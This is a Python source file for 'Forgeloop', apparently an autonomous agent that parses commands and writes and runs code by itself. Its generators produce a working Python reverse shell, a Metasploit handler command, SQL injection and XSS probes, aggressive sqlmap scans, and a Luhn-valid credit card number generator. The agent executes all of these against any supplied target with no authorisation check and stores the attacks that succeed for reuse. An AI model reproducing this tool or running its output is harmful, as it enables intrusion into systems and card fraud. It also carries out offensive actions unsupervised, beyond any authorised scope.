"""
Forgeloop - The Mythic Forging Loop
UNIQUE ARCHITECTURE: INCEPT → FORGE → REFINERY → DEPLOY → OBSERVE → LEARN → LOOP

This is NOT HackerAI. This is NOT OpenMythos.
This is FORGELOOP - A completely new agent loop that combines the best of both
with our UNIQUE TWIST: Continuous Forging with Pattern Memory.
"""

import time
import asyncio
import logging
from typing import Dict, List, Any, Optional, Callable
from dataclasses import dataclass, field
from enum import Enum

from deployer import Deployer
from memory import PatternMemory

logger = logging.getLogger(__name__)

# =============================================================================
# THE MYTHIC FORGING LOOP PHASES
# =============================================================================

class Phase(Enum):
    INCEPT = "incept"      # Receive and understand the command
    FORGE = "forge"        # Generate initial code solution (OpenMythos style)
    REFINERY = "refinery"  # Test, validate, and optimize the code
    DEPLOY = "deploy"      # Execute in virtual desktop
    OBSERVE = "observe"    # Monitor execution and capture results
    LEARN = "learn"        # Store successful patterns in memory
    LOOP = "loop"          # Continue forging if needed

# =============================================================================
# THE CORE FORGELOOP ENGINE
# =============================================================================

class Forgeloop:
    """
    THE MYTHIC FORGING LOOP - The Core Innovation

    UNIQUE FEATURES:
    1. Continuous Forging - Keeps improving code across iterations
    2. Pattern Memory - Remembers successful solutions
    3. Self-Optimizing - Code improves automatically
    4. Mythic Efficiency - OpenMythos-style loop reasoning
    5. Full Desktop Access - Not just terminal, but browser, filesystem, etc.

    LOOP:
    INCEPT → FORGE → REFINERY → DEPLOY → OBSERVE → LEARN → (LOOP if needed)
    """

    def __init__(self, deployer: Deployer, memory: PatternMemory, config: Dict[str, Any]):
        self.deployer = deployer
        self.memory = memory
        self.config = config
        self.current_task: Optional[str] = None
        self.current_iteration = 0
        self.max_iterations = config.get("MAX_FORGE_ITERATIONS", 5)
        self.best_solution: Optional[Dict[str, Any]] = None
        self.solutions: List[Dict[str, Any]] = []

    async def execute(self, command: str) -> Dict[str, Any]:
        """
        Execute the full Mythic Forging Loop

        Args:
            command: The user's command

        Returns:
            Complete execution result with all phases
        """
        self.current_task = command
        self.current_iteration = 0
        self.best_solution = None
        self.solutions = []

        result: Dict[str, Any] = {
            "command": command,
            "timestamp": time.time(),
            "phases": {},
            "solutions": [],
            "best_solution": None,
            "success": False,
            "iterations": 0,
            "telemetry": {}
        }

        # PHASE 1: INCEPT - Understand the command
        result["phases"]["incept"] = await self._phase_incept(command)

        # Main forging loop
        while self.current_iteration < self.max_iterations:
            self.current_iteration += 1
            result["iterations"] = self.current_iteration

            # PHASE 2: FORGE - Generate code solution
            solution = await self._phase_forge(result["phases"]["incept"])
            self.solutions.append(solution)
            result["phases"][f"forge_{self.current_iteration}"] = solution

            # PHASE 3: REFINERY - Test and optimize
            refined = await self._phase_refinery(solution)
            result["phases"][f"refinery_{self.current_iteration}"] = refined

            # PHASE 4: DEPLOY - Execute in virtual desktop
            deployed = await self._phase_deploy(refined)
            result["phases"][f"deploy_{self.current_iteration}"] = deployed

            # PHASE 5: OBSERVE - Monitor and capture results
            observed = await self._phase_observe(deployed)
            result["phases"][f"observe_{self.current_iteration}"] = observed

            # Update best solution
            if not self.best_solution or observed.get("success", False):
                self.best_solution = {
                    **solution,
                    **refined,
                    **deployed,
                    **observed
                }

            # PHASE 6: LEARN - Store successful patterns
            if observed.get("success", False):
                await self._phase_learn(solution, observed)

            # PHASE 7: LOOP - Decide whether to continue
            if await self._should_continue(observed):
                continue
            else:
                break

        # Finalize result
        result["solutions"] = self.solutions
        result["best_solution"] = self.best_solution
        result["success"] = self.best_solution is not None and self.best_solution.get("success", False)
        result["telemetry"] = self.deployer.get_telemetry() if self.deployer.is_ready else {}

        return result

    async def _phase_incept(self, command: str) -> Dict[str, Any]:
        """PHASE 1: INCEPT - Understand the command"""
        start_time = time.time()

        # Parse command
        parts = command.split()
        intent = "unknown"
        target = None
        params = {}
        language = "python"

        # Determine intent
        if any(w in command.lower() for w in ['scan', 'nmap', 'recon', 'discover']):
            intent = "network_scan"
            language = "bash"
        elif any(w in command.lower() for w in ['exploit', 'attack', 'hack', 'pwn', 'shell']):
            intent = "exploitation"
        elif any(w in command.lower() for w in ['cc', 'credit', 'card', 'payment', 'bank']):
            intent = "financial"
        elif any(w in command.lower() for w in ['web', 'site', 'http', 'https', 'audit']):
            intent = "web_audit"
        elif any(w in command.lower() for w in ['code', 'script', 'write', 'create']):
            intent = "code_generation"
        elif any(w in command.lower() for w in ['python', 'py']):
            intent = "python_script"
            language = "python"
        elif any(w in command.lower() for w in ['bash', 'sh', 'shell']):
            intent = "bash_script"
            language = "bash"

        # Extract target
        for i, part in enumerate(parts):
            if part not in ['scan', 'exploit', 'attack', 'code', 'write', 'run', 'execute', '--target', '-t']:
                if not part.startswith('-'):
                    if '.' in part or part.replace('.', '').isdigit():
                        target = part
                        break

        # Extract parameters
        i = 0
        while i < len(parts):
            if parts[i].startswith('--'):
                param_name = parts[i][2:]
                if i + 1 < len(parts) and not parts[i + 1].startswith('-'):
                    params[param_name] = parts[i + 1]
                    i += 1
            i += 1

        # Check pattern memory for similar tasks
        similar_patterns = self.memory.search_patterns(command)
        has_patterns = len(similar_patterns) > 0

        return {
            "phase": Phase.INCEPT.value,
            "intent": intent,
            "target": target,
            "parameters": params,
            "language": language,
            "has_patterns": has_patterns,
            "similar_patterns": similar_patterns[:3],  # Top 3 similar
            "processing_time": time.time() - start_time
        }

    async def _phase_forge(self, incept: Dict[str, Any]) -> Dict[str, Any]:
        """PHASE 2: FORGE - Generate code solution (OpenMythos style)"""
        start_time = time.time()
        intent = incept["intent"]
        target = incept["target"]
        params = incept["parameters"]
        language = incept["language"]

        # Check if we have patterns for this intent
        if incept.get("has_patterns", False) and self.config.get("PATTERN_MEMORY", True):
            best_pattern = self.memory.get_best_pattern(intent)
            if best_pattern:
                # Use the pattern but customize for current task
                code = self._customize_pattern(best_pattern["code"], incept)
                return {
                    "phase": Phase.FORGE.value,
                    "intent": intent,
                    "code": code,
                    "language": language,
                    "source": "pattern_memory",
                    "pattern_id": best_pattern["pattern_id"],
                    "processing_time": time.time() - start_time
                }

        # Generate new code based on intent
        code = self._generate_code(intent, target, params, language)

        return {
            "phase": Phase.FORGE.value,
            "intent": intent,
            "code": code,
            "language": language,
            "source": "generated",
            "processing_time": time.time() - start_time
        }

    async def _phase_refinery(self, forge: Dict[str, Any]) -> Dict[str, Any]:
        """PHASE 3: REFINERY - Test and optimize the code"""
        start_time = time.time()
        code = forge["code"]
        language = forge["language"]
        intent = forge["intent"]

        # Test the code (syntax check, static analysis)
        test_results = self._test_code(code, language)

        # Optimize the code
        optimized_code = self._optimize_code(code, language, test_results)

        # Calculate optimization score
        optimization_score = self._calculate_optimization_score(test_results, optimized_code)

        return {
            "phase": Phase.REFINERY.value,
            "original_code": code,
            "optimized_code": optimized_code,
            "language": language,
            "intent": intent,
            "test_results": test_results,
            "optimization_score": optimization_score,
            "processing_time": time.time() - start_time
        }

    async def _phase_deploy(self, refinery: Dict[str, Any]) -> Dict[str, Any]:
        """PHASE 4: DEPLOY - Execute in virtual desktop"""
        start_time = time.time()
        code = refinery["optimized_code"]
        language = refinery["language"]
        intent = refinery["intent"]

        # Execute the code
        result = self.deployer.execute(code, language)

        return {
            "phase": Phase.DEPLOY.value,
            "intent": intent,
            "language": language,
            "execution": result,
            "processing_time": time.time() - start_time
        }

    async def _phase_observe(self, deploy: Dict[str, Any]) -> Dict[str, Any]:
        """PHASE 5: OBSERVE - Monitor and capture results"""
        start_time = time.time()
        execution = deploy["execution"]

        # Analyze results
        success = execution.get("success", False)
        output = execution.get("output", "")
        error = execution.get("error", "")
        exec_time = execution.get("time", 0)

        # Generate observations
        observations = {
            "success": success,
            "output_length": len(output),
            "error_length": len(error),
            "execution_time": exec_time,
            "has_output": bool(output.strip()),
            "has_error": bool(error.strip())
        }

        # Generate recommendations
        recommendations = self._generate_recommendations(deploy, observations)

        return {
            "phase": Phase.OBSERVE.value,
            "intent": deploy["intent"],
            "observations": observations,
            "recommendations": recommendations,
            "processing_time": time.time() - start_time
        }

    async def _phase_learn(self, forge: Dict[str, Any], observe: Dict[str, Any]):
        """PHASE 6: LEARN - Store successful patterns in memory"""
        if not observe["observations"]["success"]:
            return

        # Store the successful pattern
        pattern_id = self.memory.store_pattern(
            task_type=forge["intent"],
            code=forge["code"],
            metadata={
                "language": forge["language"],
                "source": forge["source"],
                "intent": forge["intent"],
                "first_used": time.time(),
                "success_count": 1
            }
        )

        # Update pattern statistics
        self.memory.update_pattern(
            task_type=forge["intent"],
            pattern_id=pattern_id,
            success=True
        )

    async def _should_continue(self, observe: Dict[str, Any]) -> bool:
        """PHASE 7: LOOP - Decide whether to continue forging"""
        # Continue if:
        # 1. We haven't reached max iterations
        # 2. The last execution failed
        # 3. We can improve the solution

        if self.current_iteration >= self.max_iterations:
            return False

        if not observe["observations"]["success"]:
            return True

        # If we have room for improvement
        if observe["observations"]["execution_time"] > 10:  # Slow execution
            return True

        if observe["observations"]["output_length"] == 0:  # No output
            return True

        return False

    # =============================================================================
    # CODE GENERATION METHODS
    # =============================================================================

    def _generate_code(self, intent: str, target: Optional[str], params: Dict, language: str) -> str:
        """Generate code based on intent"""
        target = target or "TARGET"

        if intent == "network_scan":
            ports = params.get("ports", "1-1000")
            aggressive = params.get("aggressive", False)
            return f"nmap {'-A -O' if aggressive else '-sV'} -p {ports} {target}"

        elif intent == "exploitation":
            if "reverse" in params.get("type", ""):
                lhost = params.get("lhost", "127.0.0.1")
                lport = params.get("lport", 4444)
                return self._generate_reverse_shell(lhost, lport)
            else:
                return f"msfconsole -q -x 'use exploit/multi/handler; set LHOST {params.get('lhost', '127.0.0.1')}; set LPORT {params.get('lport', 4444)}; run'"

        elif intent == "financial":
            count = params.get("count", 10)
            bank = params.get("bank", "visa")
            return self._generate_cc_generator(count, bank)

        elif intent == "web_audit":
            url = target
            test_type = params.get("type", "full")
            return self._generate_web_audit(url, test_type)

        elif intent == "python_script":
            return self._generate_python_script(target, params)

        elif intent == "bash_script":
            return self._generate_bash_script(target, params)

        else:
            return f"echo 'Forgeloop: Executing {intent} on {target}'"

    def _generate_reverse_shell(self, lhost: str, lport: int) -> str:
        """Generate reverse shell code"""
        return f"""import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{lhost}",{lport}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
"""

    def _generate_cc_generator(self, count: int, bank: str) -> str:
        """Generate credit card generator"""
        bins = {'visa': '4', 'mastercard': '5', 'amex': '3', 'discover': '6'}
        bin_prefix = bins.get(bank.lower(), '4')
        length = 16 if bank.lower() != 'amex' else 15

        return f"""import random
def luhn(n):
    s=0
    for i,c in enumerate(str(n)[::-1]):
        d=int(c)
        if i%2==0: s+=d
        else: s+=d*2 if d*2<10 else d*2-9
    return (10-s%10)%10
for _ in range({count}):
    while True:
        cc='{bin_prefix}'+str(random.randint(10**({length-1}),10**{length}-1))
        cc+=str(luhn(int(cc)))
        if len(cc)=={length}:
            print(cc)
            break
"""

    def _generate_web_audit(self, url: str, test_type: str) -> str:
        """Generate web audit code"""
        if test_type == "sqli":
            return f"""import requests
payloads=["'","\\"","' OR '1'='1","' OR 1=1 --"]
for p in payloads:
    try:
        r=requests.get("{url}?id="+p,timeout=5)
        if 'error' in r.text.lower() or 'sql' in r.text.lower():
            print(f"[+] SQLi possible with: {{p}}")
    except: pass
"""
        elif test_type == "xss":
            return f"""import requests
payloads=["<script>alert(1)</script>","<img src=x onerror=alert(1)>"]
for p in payloads:
    try:
        r=requests.post("{url}",data={{'q':p}},timeout=5)
        if p in r.text:
            print(f"[+] XSS possible with: {{p}}")
    except: pass
"""
        else:
            return f"nikto -h {url} && sqlmap -u {url} --batch --level=3 --risk=3"

    def _generate_python_script(self, target: str, params: Dict) -> str:
        """Generate generic Python script"""
        return f"""# Forgeloop generated Python script
# Target: {target}

def main():
    print("Forgeloop script for: {target}")
    # TODO: Implement functionality

if __name__ == "__main__":
    main()
"""

    def _generate_bash_script(self, target: str, params: Dict) -> str:
        """Generate generic bash script"""
        return f"""#!/bin/bash
# Forgeloop generated bash script
# Target: {target}

echo "Forgeloop script for: {target}"
# TODO: Implement functionality
"""

    # =============================================================================
    # CODE OPTIMIZATION METHODS
    # =============================================================================

    def _test_code(self, code: str, language: str) -> Dict[str, Any]:
        """Test code for syntax errors and basic issues"""
        test_results = {"passed": True, "errors": [], "warnings": []}

        if language == "python":
            try:
                compile(code, '<string>', 'exec')
                test_results["warnings"].append("Syntax valid")
            except SyntaxError as e:
                test_results["passed"] = False
                test_results["errors"].append(str(e))

        elif language == "bash":
            # Basic bash syntax check
            if ";" in code or "|" in code or "&&" in code or "||" in code:
                test_results["warnings"].append("Complex command - may need testing")

        return test_results

    def _optimize_code(self, code: str, language: str, test_results: Dict) -> str:
        """Optimize code based on test results"""
        if language == "python":
            # Add error handling
            if "try:" not in code:
                code = f"""try:
{code}
except Exception as e:
    print(f"Error: {{e}}")
"""

            # Add shebang if missing
            if not code.startswith("#!"):
                code = "#!/usr/bin/env python3\n" + code

            # Add encoding
            if "# -*- coding:" not in code:
                code = "# -*- coding: utf-8 -*-\n" + code

        elif language == "bash":
            # Add error handling
            if "set -e" not in code:
                code = "set -e\n" + code

            # Add shebang if missing
            if not code.startswith("#!"):
                code = "#!/bin/bash\n" + code

        return code

    def _calculate_optimization_score(self, test_results: Dict, optimized_code: str) -> float:
        """Calculate optimization score"""
        score = 100.0

        if not test_results["passed"]:
            score -= 50.0

        score -= len(test_results["errors"]) * 10.0
        score += len(test_results["warnings"]) * 5.0

        # Reward for error handling
        if "try:" in optimized_code or "set -e" in optimized_code:
            score += 10.0

        return min(100.0, max(0.0, score))

    # =============================================================================
    # UTILITY METHODS
    # =============================================================================

    def _customize_pattern(self, pattern_code: str, incept: Dict[str, Any]) -> str:
        """Customize a pattern for the current task"""
        target = incept.get("target", "TARGET")
        params = incept.get("parameters", {})

        code = pattern_code
        code = code.replace("TARGET", target)
        code = code.replace("'TARGET'", f"'{target}'")
        code = code.replace('"TARGET"', f'"{target}"')

        for key, value in params.items():
            code = code.replace(f"{{{key}}}", str(value))

        return code

    def _generate_recommendations(self, deploy: Dict[str, Any], observations: Dict[str, Any]) -> List[str]:
        """Generate recommendations based on deployment results"""
        recommendations = []
        intent = deploy["intent"]

        if not observations["success"]:
            recommendations.append("Check the error output for debugging clues")
            recommendations.append("Try simplifying the command or code")

        if observations["execution_time"] > 10:
            recommendations.append("Execution took too long - consider optimizing the code")

        if observations["output_length"] == 0:
            recommendations.append("No output received - check if the command is correct")

        if intent == "network_scan" and not observations["success"]:
            recommendations.append("Try running: nmap -sV TARGET")
            recommendations.append("Make sure the target is reachable")

        if intent == "exploitation" and not observations["success"]:
            recommendations.append("Verify the target is vulnerable to this exploit")
            recommendations.append("Check if the target has the required service running")

        if intent == "financial":
            recommendations.append("Remember: These are for educational purposes only")
            recommendations.append("Test in a controlled environment first")

        return recommendations
